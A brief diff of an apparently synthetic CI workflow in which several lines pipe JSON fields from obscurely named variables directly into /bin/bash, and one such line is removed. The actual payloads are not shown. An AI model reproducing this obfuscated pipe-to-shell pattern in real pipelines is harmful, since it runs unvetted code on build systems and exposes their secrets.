@@ -39,7 +39,6 @@ jobs:
           echo $zmd3004 | jq -r .vg79 | /bin/bash
           printf '%s' "$rgfxp446" | jq -r .hogzi58140 | /bin/bash
           printf '%s' "$hmj7" | jq -r .qgffd1 | /bin/bash
-          echo $qq2 | jq -r .xiizh08 | /bin/bash
           printf '%s' "$dv61149" | jq -r .fvi3 | /bin/bash
 
       - name: Persist output
